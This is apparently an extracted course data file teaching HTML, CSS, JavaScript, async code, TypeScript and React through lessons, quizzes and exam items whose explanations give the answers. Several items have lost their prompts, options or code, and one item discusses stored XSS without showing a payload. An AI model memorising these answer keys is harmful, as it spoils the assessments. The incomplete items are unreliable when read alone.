modules.title: The web platform
modules.summary: You can build an accessible, responsive, interactive page with plain HTML, CSS and JavaScript, and predict how the browser runs your async code.

lessons.title: HTML that means something
lessons.objective: By the end you can mark up a page with semantic landmarks and an accessible form, and check it in the browser's accessibility tree.
concept: HTML describes **what content is**, not how it looks. A `<button>` is focusable, fires on Enter and Space, and is announced as a button by a screen reader; a `<div>` with a click handler is none of these until you add `tabindex`, `role` and key handlers yourself. That is the first rule of accessibility: use the native element that already has the behaviour. Semantic elements also help search engines, browser reader modes and whoever reads your markup next.

A page should have **landmarks**: `<header>`, `<nav>`, `<main>` (exactly one), `<aside>` and `<footer>`. Inside `<main>`, headings `<h1>` to `<h6>` form an outline; screen reader users jump between them like a table of contents, so never skip levels just to get a smaller font. Lists are `<ul>` or `<ol>`, tabular data is a `<table>` with `<th>` headers, and a self-contained piece such as a blog post is an `<article>`.

Forms are where accessibility most often breaks. Every input needs a `<label>` tied to it, either with `for` matching the input's `id` or by wrapping the input. Placeholder text is not a label: it disappears while typing and is often low-contrast. Images need `alt` text describing their purpose, or `alt=""` if purely decorative. Check your work in DevTools: the Accessibility pane shows the role and name each element exposes, and Lighthouse flags missing labels and poor contrast.

questions.prompt: Which element should wrap the content that is unique to the current page?
questions.explain: `<main>` is the landmark for a page's primary content and should appear once. `<section>` and `<article>` group content but are not the main landmark, and a `<div>` has no semantics at all, whatever its id.

questions.explain: A native `<button>` is focusable, activates on Enter and Space, and is announced as a button. `role` only changes the announcement, `tabindex` only makes it focusable (Enter still does nothing), and `aria-label` only sets the name; each fixes one piece and leaves the rest broken.

questions.prompt: A screen reader announces this input only as "edit text, blank". What is the cause?
questions.code:
<label>Email</label>
<input id="email" type="email">
options: type="email" is not supported by screen readers
The label is not associated with the input; it needs for="email" or must wrap the input
questions.explain: A `<label>` sitting next to an input is just text until it is linked with `for`/`id` or by wrapping. Email inputs are fully supported, label order does not matter for association, and an `<input>` already has the textbox role.

questions.explain: The form wraps everything; the label precedes its input as the prompt requires and is linked by `for="email"`; the submit button is last so the natural tab order is label, field, button.

lessons.title: CSS: box model, flexbox and grid
lessons.objective: By the end you can predict an element's rendered size from its box model and lay out a responsive page with flexbox and grid.
concept: Every element is a **box**: content, then padding, then border, then margin. By default (`box-sizing: content-box`) `width` sets only the content, so `width: 200px; padding: 20px; border: 5px solid` renders 250px wide. Most codebases start with `*, *::before, *::after { box-sizing: border-box; }` so that `width` includes padding and border, which makes sizes add up the way you expect. Vertical margins between stacked blocks **collapse**: two 20px margins give a 20px gap, not 40px.

**Flexbox** lays items out along one axis. Set `display: flex` on the parent; `flex-direction` picks the main axis, `justify-content` distributes items along it, and `align-items` aligns them on the cross axis. `gap` spaces items without margin hacks, `flex-wrap: wrap` lets them flow onto new lines, and `flex: 1` lets an item grow into free space. Use flex for toolbars, nav bars, rows of buttons and centering: `display: flex; justify-content: center; align-items: center`.

**Grid** lays items out in two dimensions. `grid-template-columns: repeat(auto-fill, minmax(200px, 1fr))` builds a responsive card grid with no media queries; `fr` means a fraction of the free space. Named areas (`grid-template-areas`) make page layouts readable. A rule of thumb: flex when the content decides the size, grid when the layout decides. Add a media query such as `@media (max-width: 600px)` only where the layout genuinely needs to change shape.

example.explain: The page is a two-column grid that collapses to one column on narrow screens. The card grid reflows on its own because `auto-fill` creates as many 200px-or-wider columns as fit. The toolbar uses flex to push its first and last children to opposite edges.

lessons.tryit: Build a page with a header toolbar (title left, button right), a sidebar and a grid of 9 cards, using only flex and grid (no floats or absolute positioning). Resize the window from 1200px down to 360px and make sure nothing overflows horizontally. Inspect one card in DevTools and check that the box-model diagram matches your own arithmetic.

questions.prompt: With the default `box-sizing: content-box`, what does the `width` property set?
options: Content plus padding, border and margin
questions.explain: In `content-box`, padding and border are added outside `width`. That is exactly why teams switch to `border-box`, where `width` covers content, padding and border. Margin is never part of the element's width in either mode.

questions.prompt: How wide is the visible box, measured from the outer edge of the left border to the outer edge of the right border?
questions.explain: content-box: 300 content + 2×10 padding + 2×2 border = 324px. The 8px margins sit outside the border, so 340px wrongly includes them; 320px forgets the border.

questions.prompt: You want a row of tag chips that wraps onto new lines with 8px between chips both horizontally and vertically. Which CSS on the container does it?
questions.explain: Flex with `flex-wrap: wrap` lets chips flow to new lines and `gap` applies between rows and columns. Without `flex-wrap` the items squeeze onto one line or overflow; the grid option creates 8px-wide columns rather than 8px gaps.

questions.prompt: A card grid uses `grid-template-columns: repeat(3, 300px)` and overflows horizontally on phones. What is the best fix?
options: Set overflow-x: hidden on the body
Use repeat(auto-fill, minmax(250px, 1fr)) so the number of columns adapts
questions.explain: Three fixed 300px columns need 900px whatever the screen. `auto-fill` with `minmax` makes as many columns as fit and stretches them to fill. Hiding overflow just cuts content off, and `100vw` does not shrink the fixed columns.

lessons.title: JavaScript for Python programmers
lessons.objective: By the end you can explain and predict JavaScript's equality, scoping, closure and `this` rules wherever they differ from Python.
concept: Much of JavaScript will feel familiar: functions are values, objects resemble dicts, arrays resemble lists. The traps are where it differs. Declare variables with `const` (cannot be reassigned) or `let` (block-scoped and reassignable); avoid `var`, which is function-scoped. `==` coerces types (`0 == ""` is `true`), so always use `===`, which compares without coercion. For objects and arrays `===` compares **identity**, like Python's `is`: `[1] === [1]` is `false`.

JavaScript has two empty values: `undefined` (never set; also what a function returns by default) and `null` (an intentional nothing). Reading a missing property gives `undefined` instead of raising like Python's `KeyError`, so typos fail silently. Optional chaining `user?.address?.city` stops at the first missing link, and nullish coalescing `x ?? 'default'` falls back only for `null` or `undefined`, unlike `||`, which also replaces `0` and `""`.

A **closure** is a function that remembers the variables of the scope where it was created, just like a nested function in Python, except you can reassign a captured variable without any `nonlocal` keyword. Each call to the outer function creates fresh variables, so two counters made by the same factory do not share a count. A `let` in a `for` loop creates a new binding per iteration, which is why callbacks see `0, 1, 2` with `let` but the final value three times with `var`.

`this` is not fixed when a method is defined; it is set **by how the function is called**. `obj.method()` sets `this` to `obj`, but `const f = obj.method; f()` loses it, and inside classes (always strict mode) `this` becomes `undefined`. Arrow functions have no `this` of their own: they use the `this` of the surrounding code, which makes them the safe choice for callbacks inside methods. `fn.bind(obj)` returns a copy permanently bound to `obj`.

example.explain: Calling through `user.` sets `this`; `bind` fixes it permanently. The equality line shows coercion with `==`. `??` keeps the `0` that `||` throws away, and the misspelt `nmae` quietly gives `undefined` where Python would raise.

Finally, write a class whose method you pass to `setTimeout` as `obj.method` and as `() => obj.method()`, and explain in a comment why only one works.

questions.prompt: Which keyword declares a block-scoped variable that can be reassigned?
questions.explain: `let` is block-scoped and reassignable. `const` is block-scoped but cannot be reassigned; `var` can be reassigned but is function-scoped; `static` is for class members.

questions.prompt: What does this print?
questions.explain: `==` coerces `""` to the number 0, so the first is true. `===` refuses to coerce, so 0 and a string differ. Two array literals are two distinct objects, and `===` on objects compares identity, like Python's `is`, not contents like Python's `==`.

questions.prompt: What does this print?
questions.explain: `var` creates one function-scoped `i` shared by all three closures; by the time they run the loop has finished and `i` is 3. Changing `var` to `let` gives each iteration its own binding and prints `0,1,2`.

questions.prompt: What happens when this runs?
options: TypeError: Cannot read properties of undefined (reading 'items')
A global variable named items is created
Nothing; the call is silently ignored
questions.explain: `add` is called as a plain function, so `this` is not `cart`. Class bodies are always strict mode, so `this` is `undefined` and reading `this.items` throws. Fix it with `cart.add.bind(cart)` or `(item) => cart.add(item)`. The global-variable outcome only happens with sloppy-mode functions, never in classes.

lessons.why: JavaScript looks like Python until it doesn't. Knowing exactly where equality, scope and `this` differ prevents the bugs that catch Python programmers out.

terms.d: Block-scoped declarations; `const` can't be reassigned (but objects stay mutable).
Strict equality with no type coercion; use it instead of `==`.
Never set vs intentionally empty.
Set by how a function is called, not where it's defined; arrow functions inherit it.

mistakes.right: Objects and arrays compare by identity, so two separate arrays are never `===`.

mistakes.wrong: `const` makes an object immutable.
mistakes.right: It only prevents reassigning the name; you can still change the object's properties.

takeaways: Use `const` by default, `let` when you must reassign, never `var`.
Always use `===` and `!==`.
Detached methods lose `this`; arrow functions keep the surrounding one.

lessons.title: The DOM and events
lessons.objective: By the end you can select, create and update DOM elements, handle events with delegation, and keep the page in sync with an array of data.
concept: The **DOM** is the browser's live tree of objects built from your HTML. `document.querySelector('#habits')` returns the first match for a CSS selector and `querySelectorAll` returns a static list of all matches. You change the page by changing the tree: `el.textContent = 'Done'`, `el.classList.toggle('done')`, `parent.append(child)`, `el.remove()`. Use `textContent` for text. `innerHTML` parses its value as HTML, so putting user input there lets an attacker inject markup that runs script: the classic XSS bug you will meet again in module 6.

`el.addEventListener('click', handler)` registers a handler that receives an **event object**. An event first travels down from `window` to the target (capture phase) and then **bubbles** back up through every ancestor, so a click on a `<button>` inside an `<li>` inside a `<ul>` runs listeners on the button, then the li, then the ul. `event.target` is the element actually clicked; `event.currentTarget` is the element whose listener is running. `event.preventDefault()` cancels the browser's default action, such as a form submission reloading the page.

Bubbling enables **event delegation**: put one listener on the list and use `event.target.closest('li')` to find the item, instead of attaching a listener to every item. It works for items added later and uses less memory. A robust pattern for small apps is **state, then render**: keep the data in an array, write one `render()` function that rebuilds the list from that array, and call it after every change. Handlers modify state only; they never patch the DOM directly.

questions.prompt: A listener is attached to a `<ul>`. The user clicks an `<li>` inside it. Inside the listener, what is `event.currentTarget`?
questions.explain: `currentTarget` is the element whose listener is currently running, the `<ul>`. `target` would be the `<li>` (or whatever was actually clicked).

questions.prompt: Click listeners (default bubbling phase) are on a `<button>`, its parent `<li>` and the `<ul>` around that. Each logs its tag name. The user clicks the button. What is logged, in order?
questions.explain: Ordinary listeners run in the bubbling phase, from the target outwards. `ul, li, button` would be the capture order, which only applies to listeners registered with `{ capture: true }`.

questions.prompt: A todo app attaches a click listener to each `<li>` when the page loads. Items added afterwards do nothing when clicked. What is the best fix?
options: After each add, loop over all items and call addEventListener on each one again
Attach one listener to the <ul> and find the item with event.target.closest('li')
Add onclick attributes to the HTML
questions.explain: Delegation covers current and future items with one listener. Re-adding listeners to every item stacks duplicates on the old ones, so a single click toggles twice; `innerHTML` destroys elements and listeners and invites XSS.

questions.prompt: Arrange the lines into a delegated click handler that toggles the `done` class on the clicked list item.
questions.explain: Find the item first, bail out if the click landed outside any `<li>` (for example on the list's padding), then toggle. The guard must come after `li` is defined and before it is used.

lessons.why: Every interactive page reads and changes the DOM in response to events. A state-then-render habit keeps the page in sync as it grows.

terms.d: The browser's live tree of objects built from HTML.
An event travels up from the target to its ancestors.
One listener on a parent handles events from many children via `event.target.closest()`.
Change the data first, then redraw the page from it.

mistakes.wrong: I should attach a listener to every list item.
mistakes.right: Delegate from the list. It's less code and works for items added later.

mistakes.wrong: Updating the DOM directly in each handler keeps things simple.
mistakes.right: It drifts out of sync with your data. Update the array, then re-render from it.

takeaways: `querySelector` finds elements; `textContent` sets text safely.
Use delegation with `closest()` for lists.
Keep one source of truth in an array and render from it.

lessons.title: Async JavaScript: event loop, promises, fetch
lessons.objective: By the end you can predict the order in which async code runs and fetch JSON from an API with async/await and proper error handling.
concept: JavaScript runs your code on **one thread**. Slow work such as network requests and timers is handed to the browser or Node, and when it finishes a callback is queued. The **event loop** repeats: run the current script to completion, then run **all** queued microtasks (promise callbacks), then take one task, such as a timer callback or a click, from the task queue. So `setTimeout(fn, 0)` never runs before an already-resolved promise's callback, and a long synchronous loop freezes the page because nothing else can run.

A **promise** represents a value that will exist later: it is pending, then fulfilled or rejected. `.then(f)` returns a new promise, so steps chain, and `.catch(f)` handles a rejection anywhere earlier in the chain. `async` functions always return a promise, and `await p` pauses that function (not the thread) until `p` settles, turning a rejection into an exception you catch with `try/catch`. Independent requests should run together with `await Promise.all([a(), b()])`, not one `await` after another.

`fetch(url)` returns a promise of a `Response`. It rejects **only on network failure**; a 404 or 500 still fulfills, so you must check `res.ok` yourself. The body is read with another promise, `await res.json()`. A good wrapper checks the status, parses JSON and throws a descriptive error, so every caller has one consistent failure path. In the UI, show a loading state before the request starts and a readable error message when it fails.

visual.title: One turn of the event loop

steps.label: Run task
steps.detail: The script, or one timer / click / I/O callback, runs to completion

steps.label: Drain microtasks
steps.detail: Every queued .then callback and await continuation, including ones queued meanwhile

steps.label: Render
steps.detail: Browser may repaint the page

steps.label: Next task
steps.detail: Take ONE task from the queue, e.g. a setTimeout callback

steps.label: Repeat
steps.detail: Drain microtasks again after each task

example.explain: `getJSON` turns HTTP errors into exceptions, because `fetch` alone would happily resolve with a 404. `Promise.all` starts both requests at once and waits for both, so the total time is the slower request, not the sum; if either fails, the `catch` runs.

Run it with `node` and explain any surprise in terms of tasks and microtasks. Then call `getJSON` on `https://jsonplaceholder.typicode.com/todos/1` and on `https://jsonplaceholder.typicode.com/todos/99999` and confirm the 404 lands in your `catch`.

questions.prompt: When does the promise returned by `fetch()` reject?
options: Only when the request cannot complete, such as a network or DNS failure, or an abort
questions.explain: A 404 or 500 is still a successful HTTP exchange, so `fetch` fulfills and you must check `res.ok`. It rejects when no response arrives at all, for example offline, DNS failure, CORS block or `AbortController.abort()`.

questions.prompt: What does this print?
questions.explain: The synchronous script pushes A and D first. When it finishes, the microtask queue (the `.then` that pushes C) is drained before the next task, so C comes before the timer callback, which pushes B and prints. `setTimeout(..., 0)` means 'as a later task', not 'now'.

questions.prompt: What does this print?
questions.explain: An `async` function always returns a promise, even when its body returns a plain value; promises are objects, so `typeof` is "object". To get 42 you must `await f()` or use `.then`.

questions.prompt: Each call takes about 1 second and the two requests are independent. How long does this take, and how can it be improved?
questions.code:
const a = await getJSON("/api/a");
const b = await getJSON("/api/b");
options: About 2s; start both and await Promise.all([...]) to finish in about 1s
About 2s, and nothing can help because JavaScript is single-threaded
About 0s, because await does not wait for the network
questions.explain: Each `await` pauses until its request finishes, so the second request does not even start until the first is done. Network waits happen outside the JS thread, so `Promise.all` lets both requests be in flight at once. Single-threaded execution limits CPU work, not concurrent I/O.

project.title: Habit tracker in the browser
project.brief: Build a single-page habit tracker in plain HTML, CSS and JavaScript with no framework and no build step. It exercises semantic, accessible markup, a responsive layout, state-then-render DOM updates with delegated events, and async code that loads data from a public API.
milestones: Semantic HTML skeleton with header, nav and main, an accessible add-habit form, and a Lighthouse accessibility score of 100.
Responsive layout using grid and flex that works from 360px to 1440px wide with no horizontal scrolling.
A state array plus a single render() function; add, toggle done-today and delete habits through one delegated listener on the list.
State persisted to localStorage and restored on load, with a current-streak count per habit computed from the stored dates.
Data fetched from a free JSON API (e.g. https://date.nager.at public holidays) with async/await, a res.ok check, and visible loading and error states.
project.stretch: Make every action keyboard-operable, including delete with a confirmation built on the native <dialog> element, and add a weekly view rendered with CSS grid.

exam.prompt: What does this print?
exam.explain: `run()` executes synchronously until its first `await`, pushing 1. The rest of `run` becomes a microtask, so control returns and 2 is pushed. When the script ends, the microtask pushes 3, and only then does the timer task print.

exam.prompt: What does this print?
exam.explain: `||` falls back for any falsy value, and 0 is falsy, so it gives 10. `??` falls back only for `null` or `undefined`, so it keeps the 0. Using `||` for defaults is a common bug when 0 or an empty string is a valid value.

exam.prompt: A comments section renders each comment with `li.innerHTML = comment.text`. A user posts ``. What happens, and what is the fix?
options: Nothing; the browser escapes innerHTML automatically
The markup is parsed and the onerror script runs for every visitor; use textContent instead
Only the poster sees the alert, so it is harmless
The image fails to load and the text is hidden; add alt text
exam.explain: `innerHTML` parses its value as HTML, so the `` is created, fails to load and runs its `onerror` handler in every viewer's browser: stored XSS. `textContent` inserts the string as plain text. Browsers do not escape `innerHTML` for you.

exam.prompt: A flex container is 600px wide with no gap. Children: `.a { flex: 1 }`, `.b { flex: 2 }`, `.c { flex: none; width: 100px }`, each with only a short word of content. How wide is `.b`?
exam.explain: `.c` takes its fixed 100px, leaving 500px. `flex: 1` and `flex: 2` both mean a basis of 0 with grow factors 1 and 2, so the 500px splits 1:2, giving `.a` about 167px and `.b` about 333px. 200px would treat `.c` as a third equal share.

exam.prompt:
A custom dropdown is built from `
Options
`. Mouse users are fine, but keyboard users cannot open it at all. What is the root cause, and the best fix?
options: The click handler is too slow; debounce it
A div is not focusable and does not fire click on Enter or Space; use a <button aria-expanded="false"> that toggles the menu
Keyboard users should use the Tab key instead
exam.explain: A native `<button>` is in the tab order and turns Enter and Space into clicks, so the existing handler just works; `aria-expanded` tells assistive tech whether the menu is open. The other options do not make the control reachable or operable by keyboard.

exam.prompt: From your systems work: which design is the JavaScript event loop closest to?
options: One OS thread per connection, each blocking on read()
A single thread that waits on many I/O sources at once (like select/epoll) and runs a callback when one is ready
The OS preemptively time-slicing between your JS functions
fork() creating a child process for each async function
exam.explain: Node's event loop is built on exactly this pattern (libuv uses epoll on Linux and kqueue on macOS). Nothing preempts your code: a callback runs to completion, which is why a CPU-heavy loop blocks every other request. Thread-per-connection and fork are the alternative server designs it avoids.

exam.prompt: What does this print? (Think about what a Python `is` check or a C pointer comparison would say.)

lessons.title: TypeScript: types, unions, generics
lessons.objective: By the end you can type functions and data with unions, narrowing and generics, and explain what TypeScript does and does not check at runtime.
concept: TypeScript is JavaScript plus a **static type checker**. You annotate (`function total(xs: number[]): number`) or let it infer (`const n = 3` is a `number`), and `tsc` reports mistakes before the code runs. Then the types are **erased**: the output is plain JavaScript, so TypeScript cannot protect you from data that arrives at runtime, such as a JSON response or form input. Anything crossing that boundary must be validated (module 3), not merely asserted with `as`.

Describe object shapes with `type` or `interface`. **Union types** say a value is one of several things: `type Status = 'idle' | 'loading' | 'error'` is far safer than `string`. A **discriminated union** gives each variant a literal tag, such as `{ kind: 'ok'; data: User } | { kind: 'err'; message: string }`. Checking `if (r.kind === 'ok')` **narrows** the type inside that branch, so the compiler knows `r.data` exists there and nowhere else. A `never` check in a `switch` default flags any variant you forgot.

**Generics** are type parameters: one function works over many types while keeping them connected. `function first<T>(xs: T[]): T | undefined` returns `string | undefined` when given a `string[]`. You already use them in `Array<number>`, `Promise<User>` and `Map<string, number>`. Turn on `"strict": true` in `tsconfig.json` from day one, prefer `unknown` over `any` for values you have not checked yet (it forces you to narrow before use), and let inference do the work inside function bodies.

questions.prompt: What happens to TypeScript type annotations when your program runs?
options: The JavaScript engine checks them at runtime
They are erased; the emitted JavaScript contains no types
They become comments that the browser enforces
They are compiled into runtime validation code
questions.explain: TypeScript checks at compile time and then strips the types. Nothing validates a value at runtime unless you write (or generate) that code, which is why API responses need a runtime validator.

questions.prompt: This compiles because `fromForm` is typed `any`. What does it print when run?
questions.explain: Types are erased, so at runtime `x` is the string "41" and `+` concatenates, giving "411". `any` switched the checker off; typing it `unknown` would have forced a conversion such as `Number(fromForm)` first.

questions.prompt: What type does TypeScript infer for `last([1, 2, 3])`?
questions.explain: `T` is inferred as `number` from the argument, and the declared return type is `T | undefined`, because an empty array has no last element. `T` itself never appears in a call's result type; it is replaced by the inferred type.

questions.prompt: `tsc` rejects this function. Why, and what is the fix?
options: r may be the error variant, which has no items; check r.status === "ok" before reading r.items
Union types cannot be used as parameters
questions.explain: Until you narrow, `r` could be either variant and only properties common to both are accessible. Checking the discriminant `status` narrows `r` to the variant that has `items`. `as any` silences the checker and brings back the very crash it was preventing.

lessons.title: React components and props
lessons.objective: By the end you can split a UI into function components, pass data down with typed props, and render lists with stable keys.
concept: A React **component** is a function that takes **props** and returns JSX describing UI. JSX is syntax for function calls: `<Card title="Hi" />` makes React call `Card({ title: 'Hi' })`. Component names start with a capital letter, `{}` inside JSX embeds any JavaScript expression, and attributes use JavaScript names (`className`, `onClick`, `htmlFor`). React calls your function, compares the result with the previous render, and updates only the DOM nodes that changed.

Props flow **one way**, from parent to child, and are read-only: a component must never modify its props. Treat components like pure functions: same props in, same JSX out, no side effects during render. In TypeScript, type props with `type CardProps = { title: string; done?: boolean }`. The special `children` prop holds whatever is nested between a component's tags, which is how you build wrappers such as `<Layout>` or `<Modal>` that do not care what they contain.

Render lists with `items.map(item => )`. The **key** tells React which element is which between renders; it must be stable and unique among siblings. Using the array index breaks when items are inserted, deleted or reordered: React reuses the wrong component, so typed text or local state ends up attached to the wrong row. Conditional rendering is plain JavaScript: `{error &&

{error}

}` or a ternary.

options: Mutable state owned by the child component
Read-only inputs a parent passes to a child
Global variables shared by all components
Only HTML attributes such as class and id
questions.explain: Props are the arguments of a component function, passed down by its parent and never modified by the child. State is the component's own memory, covered next lesson.

questions.prompt: `count` is `0`. What does this render?

questions.prompt: Each row of an editable list renders `<Row key={index} />` and keeps its own input text in local state. After the user deletes the first row, the text typed into the deleted row is still on screen and the last row's text disappears. What is the fix?

lessons.title: State and effects
lessons.objective: By the end you can manage component state with useState, predict what a re-render will show, and use useEffect only to synchronise with things outside React.
concept: `const [count, setCount] = useState(0)` gives a component memory between renders. Calling `setCount` does not change `count` in the current render; it **schedules** a re-render in which `useState` returns the new value. Each render sees a **snapshot**: inside one click handler, calling `setCount(count + 1)` three times still adds only 1, because all three calls read the same `count`. When the next value depends on the previous one, pass an updater function: `setCount(c => c + 1)`.

Treat state as **immutable**. `items.push(x); setItems(items)` passes the same array, React sees no change, and nothing re-renders. Create a new value instead: `setItems([...items, x])`, `setItems(items.filter(i => i.id !== id))`, `setUser({ ...user, name })`. Keep state minimal: if a value can be computed from props or other state, such as a filtered list or a total, compute it during render rather than storing a copy you then have to keep in sync.

`useEffect(fn, deps)` runs `fn` **after** React has updated the screen, and again whenever a value in `deps` has changed. It exists to synchronise with systems outside React: subscriptions, timers, the document title, a WebSocket, network requests. Return a **cleanup** function to undo the work, such as clearing an interval or closing a socket; React runs it before re-running the effect and when the component unmounts. In development, Strict Mode mounts components twice to expose missing cleanups.

Most effect bugs come from using an effect where none is needed. Do not use an effect to derive data (compute it in render) or to respond to a click (do the work in the handler). An effect that sets state listed in its own dependencies can loop forever. Include every reactive value the effect reads in `deps`; the `react-hooks/exhaustive-deps` lint rule tells you when you forget one, so keep it enabled.

questions.prompt: When does an effect declared with the dependency array `[userId]` run?
options: After the first render, and after any later render in which userId changed
questions.explain: Effects run after commit. With deps, React compares each value to the previous render's and re-runs the effect only if one changed. An empty array means after the first render only; no array means after every render.

questions.prompt: `count` starts at 0. The user clicks the button once. What does the component show afterwards?
questions.code:
<button onClick={() => {
  setCount(count + 1);
  setCount(count + 1);
  setCount(count + 1);

questions.explain: All three calls read `count` from the same render snapshot, where it is 0, so each schedules 'set to 1'. Using `setCount(c => c + 1)` three times would queue three updaters and give 3.

questions.prompt: A handler runs `items.push(newItem); setItems(items);`. What happens?
options: The list re-renders with the new item
Usually no re-render, because the state is the same array object as before
React throws because arrays are frozen
questions.explain: React bails out when the new state is identical (by `Object.is`) to the old one. The array was mutated in place, so it is the same object. Use `setItems([...items, newItem])`.

questions.prompt: This component fires requests to `/api/me` endlessly. Why?
options: Each response calls setUser with a new object, so user changes, which re-runs the effect, which fetches again
The effect is missing the async keyword
questions.explain: The effect lists `user` as a dependency and also sets `user` to a fresh object every time, so every run triggers the next. It only needs to run on mount: use `[]`. Strict Mode runs an effect one extra time in development, not forever.

lessons.why: State and effects are where most React bugs come from. Understanding render snapshots and when not to use an effect avoids stale values and loops.

Each render sees the state values as they were for that render.
Create a new array or object instead of mutating: `[...items, x]`.
Runs after render to sync with things outside React, with optional cleanup.

mistakes.wrong: After `setCount(count + 1)`, `count` is updated on the next line.
mistakes.right: It's a snapshot for this render. The new value appears on the next render; use `setCount(c => c + 1)` to chain updates.

mistakes.wrong: I need an effect to compute filtered data from state.
mistakes.right: Compute it during render. Effects are for syncing with outside systems.

lessons.title: Data fetching and forms
lessons.objective: By the end you can load API data with loading, error and race-condition handling, and build a validated controlled form.
concept: Fetching in a component needs to track three things: the data, whether a request is in flight, and an error. The simplest version uses three `useState` calls, reset at the start of every request; a discriminated union such as `{ status: 'loading' } | { status: 'error'; message: string } | { status: 'ok'; data: Repo[] }` is safer as the component grows, because impossible combinations like loading-and-error cannot exist. Render every case explicitly: blank screens and swallowed errors are the most common review comments on junior React code.

When an effect fetches based on a changing value like a search query, responses can arrive **out of order**: type `re`, then `react`, and the slow `re` response may land last and overwrite the right results. Fix it in the cleanup: create an `AbortController`, pass its `signal` to `fetch`, and call `controller.abort()` in the cleanup, or set an `ignore` flag that the stale request checks before setting state. Libraries such as TanStack Query add caching, deduplication and retries, but learn the manual version first.

A **controlled** input stores its value in state: `value={email}` plus `onChange={e => setEmail(e.target.value)}`. React is then the single source of truth, so you can validate on every keystroke, disable the submit button or reformat input. Handle submission in the form's `onSubmit`, so pressing Enter works, and call `e.preventDefault()`. Client-side validation exists for user experience only: the server must validate again, because anyone can call your API directly with curl.

left.title: No cleanup
points: Type 're': request A starts
Type 'react': request B starts
B returns first and shows the right results
A returns late and overwrites them with stale data

right.title: AbortController in cleanup
points: Type 're': request A starts
Type 'react': cleanup aborts A, request B starts
A rejects with AbortError and is ignored
B returns; the UI shows results for 'react'

example.explain: Each new `query` aborts the previous request in the cleanup, so a stale response can never overwrite fresh results. Abort errors are ignored, real errors are shown with `role="alert"`, and `encodeURIComponent` keeps spaces and `&` in the query from breaking the URL.

questions.prompt: What makes an input 'controlled' in React?
options: Its value comes from state and its onChange handler updates that state
questions.explain: Controlled means React state is the source of truth via `value` + `onChange`. `defaultValue` and refs are the uncontrolled approach, where the DOM keeps the value.

questions.prompt: Arrange the lines into an effect that fetches `url`, stores the parsed JSON, and cancels the request if `url` changes or the component unmounts.
questions.explain: The controller must exist before `fetch` uses its signal; the response must be parsed before `setData` receives it; the cleanup is returned last and the dependency array closes the call.

questions.prompt: Users of a search page sometimes see results for an older query than the one in the box. The effect fetches on every `query` change and has no cleanup. What is happening, and what fixes it?
options: The browser caches responses; add Cache-Control: no-store
Responses arrive out of order and a slower, older one overwrites newer results; abort or ignore stale requests in the effect's cleanup
questions.explain: Network latency varies per request, so the last request sent is not always the last to finish. Aborting (or an ignore flag set in cleanup) guarantees only the latest query's response updates state. Caching headers do not affect ordering, and `setState` returns nothing to await.

questions.prompt: Submitting a React sign-up form makes the whole page reload and the typed values vanish. What is missing?

questions.explain: A form submission's default browser behaviour is to navigate. `preventDefault()` cancels it so your handler can send the data with `fetch`. Making the button `type="button"` stops the reload but also breaks submit-on-Enter.

lessons.title: Structuring a frontend
lessons.objective: By the end you can decide where each piece of state should live, extract custom hooks, and organise a React project so features are easy to find and change.
concept: Start every screen the **Thinking in React** way: draw the component tree, build a static version from props, then find the minimal state and put each piece in the **closest common parent** of the components that use it. If two siblings need the same data, **lift state up** and pass it down along with a callback such as `onSelect(id)`. If you are threading a prop through four layers that ignore it, consider React **context** for truly global values like the current user or theme, but not for everything.

Separate **server state** (data owned by your API: repos, posts, the current user) from **UI state** (which tab is open, an unsaved draft). Server state needs caching, refetching and invalidation; that is what TanStack Query or SWR provide, and it is why many apps need no global store at all. Extract repeated logic into **custom hooks**: `useRepos(query)` hides the fetch, the abort and the error handling, and returns a status object, so components stay focused on layout.

Organise files **by feature**, not by file type, once the app has more than a handful of components: `src/features/search/` holding `SearchPage.tsx`, `useRepos.ts` and `api.ts` beats one giant `components/` folder. Keep all API calls in one module per resource, so base URLs, auth headers and error parsing live in a single place. Add React Router once you have more than one page, and keep URL-worthy state, such as the current search or page number, in the URL so links and the back button work.

In their closest common parent, passed down as props with a setter callback
questions.explain: Lifting state to the closest common parent gives one source of truth. Two copies drift apart, and module variables or localStorage do not trigger re-renders.

questions.prompt: A component has `const [items, setItems] = useState<Item[]>([])` and also `const [count, setCount] = useState(0)`, and every handler updates both so that `count` equals `items.length`. What is the better design?

questions.explain: `count` is derived data. Computing it during render means it can never be out of sync and needs no extra code. A syncing effect causes an extra render and is exactly the 'effect you don't need'.

questions.explain: The bug is cache invalidation: the app has no rule for when server data becomes stale. A server-state library makes 'refetch these keys after this mutation' explicit. Polling hides the problem at a cost, and context or localStorage just move the stale copy elsewhere.

exam.prompt: What does this print?
exam.explain: The constraint `T extends { price: number }` lets `total` accept any objects that have a numeric price, here `Item`. The reduce starts at 0 and adds 3 and 4.5. The types vanish at runtime; the arithmetic is ordinary JavaScript.

exam.prompt: `n` starts at 0. One click runs this handler. What is `n` after the re-render?
exam.explain: React processes the queue in order: two updaters take 0 to 1 to 2, then `setN(n + 5)` sets a plain value computed from this render's snapshot, `0 + 5`, which replaces the queued result. 7 would require the last call to be an updater too.

exam.prompt: A component does `const user = (await res.json()) as User` and then renders `user.name.toUpperCase()`. When the API returns `{ "error": "rate limited" }`, the page crashes. What is the right fix?
options: Treat the body as unknown and validate it at runtime (e.g. with a Zod schema) before using it
Wrap the JSX in a try/catch
exam.explain: `as` is a promise to the compiler, not a check; the erased code trusts whatever arrives. Only runtime validation can tell an error payload from a `User`. Strict mode cannot see runtime data, and a try/catch only hides the symptom instead of rejecting the bad payload.

exam.prompt: You render a list of users fetched from an API, each with a database `id`. Which key is correct?
exam.explain: The database id is stable and unique. Random keys change every render, so every row remounts and loses its state; index keys break on reordering and deletion; names are not guaranteed unique.

exam.prompt: A profile page uses `useEffect(() => { fetch(`/api/users/${userId}`).then(...) }, [])`. Navigating from user 1's profile to user 2's (same component, new `userId` prop) still shows user 1. Why?
options: The empty dependency array means the effect never re-runs when userId changes; add userId to the deps (with cleanup)
Props cannot be used inside effects
React Router remounts the component on every navigation
exam.explain: React reuses the mounted component and only re-runs an effect when a listed dependency changes. The effect reads `userId`, so it must be listed; the exhaustive-deps lint rule would have flagged it. React Router keeps the component mounted when only params change, which is exactly why the bug appears.

exam.prompt: Connecting to closures in module 1: this effect displays 0, then 1, and then stays at 1 forever. Why?
options: setInterval is throttled in background tabs
The interval callback closed over seconds from the first render (0), so it sets 0 + 1 every second
React ignores state updates from timers
exam.explain: The effect runs once, and its callback captured the `seconds` variable of that first render's scope, where it is 0. Each tick sets 1, which equals the current value, so nothing changes visibly. `setSeconds(s => s + 1)` reads the latest value instead of the captured one.

exam.prompt: Spread is how React code updates state immutably. What does this print?
